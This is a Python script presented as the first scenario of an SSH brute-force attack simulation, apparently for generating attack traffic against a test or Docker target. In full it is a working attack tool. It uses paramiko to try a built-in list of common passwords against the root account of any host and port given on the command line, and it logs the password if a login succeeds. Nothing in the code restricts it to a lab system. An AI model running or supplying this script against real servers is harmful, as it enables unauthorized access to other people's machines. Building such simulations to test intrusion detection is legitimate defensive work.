"""
Scenario 1: Basic SSH Brute-Force Attack Simulation

Simulates a rapid password brute-force from a single IP against root.
Uses paramiko for SSH connection attempts.

Usage:
    python brute_force_basic.py --target 192.168.1.100 --port 22 --rate 10
    python brute_force_basic.py --target localhost --port 2222  # Docker demo
"""

import argparse
import time
import logging
import sys
from datetime import datetime

try:
    import paramiko
except ImportError:
    print("Install paramiko: pip install paramiko")
    sys.exit(1)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Common passwords for brute-force simulation
PASSWORDS = [
    'password', '123456', 'root', 'admin', 'toor', 'password123',
    'qwerty', 'letmein', 'welcome', 'monkey', '1234567890', 'abc123',
    'dragon', 'master', 'login', 'princess', 'starwars', 'passw0rd',
    'shadow', 'sunshine', 'trustno1', 'iloveyou', '000000', 'batman',
    'access', 'hello', 'charlie', 'donald', 'password1', '123456789',
    'qwerty123', 'mustang', 'solo', 'hockey', 'ranger', 'thomas',
    'klaster', 'robert', 'daniel', 'soccer', 'george', 'computer',
    'tigger', 'hammer', 'andrew', 'pepper', 'buster', 'ginger',
    'joshua', 'summer', 'taylor', 'matrix', 'harley', 'silver',
]


def attempt_login(host: str, port: int, username: str, password: str, timeout: int = 3) -> bool:
    """Attempt SSH login with given credentials."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            look_for_keys=False,
            allow_agent=False,
        )
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        logger.debug(f"Connection error: {e}")
        return False
    finally:
        client.close()


def run_brute_force(
    target: str,
    port: int = 22,
    username: str = 'root',
    rate: float = 10,
    max_attempts: int = 50,
    passwords: list = None,
):
    """Run basic brute-force attack simulation.

    Args:
        target: Target SSH server IP/hostname
        port: SSH port
        username: Target username
        rate: Attempts per second
        max_attempts: Maximum number of attempts
        passwords: Password list (default: built-in common passwords)
    """
    passwords = passwords or PASSWORDS[:max_attempts]
    delay = 1.0 / rate if rate > 0 else 0.1

    logger.info(f"=== Basic Brute-Force Simulation ===")
    logger.info(f"Target: {target}:{port}")
    logger.info(f"Username: {username}")
    logger.info(f"Rate: {rate} attempts/sec")
    logger.info(f"Passwords: {len(passwords)}")
    logger.info(f"Starting at: {datetime.now().isoformat()}")
    logger.info(f"{'='*50}")

    success = False
    for i, password in enumerate(passwords[:max_attempts]):
        logger.info(f"[{i+1}/{min(len(passwords), max_attempts)}] Trying: {username}:{password}")

        result = attempt_login(target, port, username, password)
        if result:
            logger.warning(f"SUCCESS! Password found: {password}")
            success = True
            break

        time.sleep(delay)

    if not success:
        logger.info(f"Attack completed. No valid password found after {min(len(passwords), max_attempts)} attempts.")

    logger.info(f"Finished at: {datetime.now().isoformat()}")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Basic SSH Brute-Force Simulation')
    parser.add_argument('--target', required=True, help='Target SSH server')
    parser.add_argument('--port', type=int, default=22, help='SSH port')
    parser.add_argument('--username', default='root', help='Target username')
    parser.add_argument('--rate', type=float, default=10, help='Attempts per second')
    parser.add_argument('--max-attempts', type=int, default=50, help='Max attempts')
    args = parser.parse_args()

    run_brute_force(
        target=args.target,
        port=args.port,
        username=args.username,
        rate=args.rate,
        max_attempts=args.max_attempts,
    )
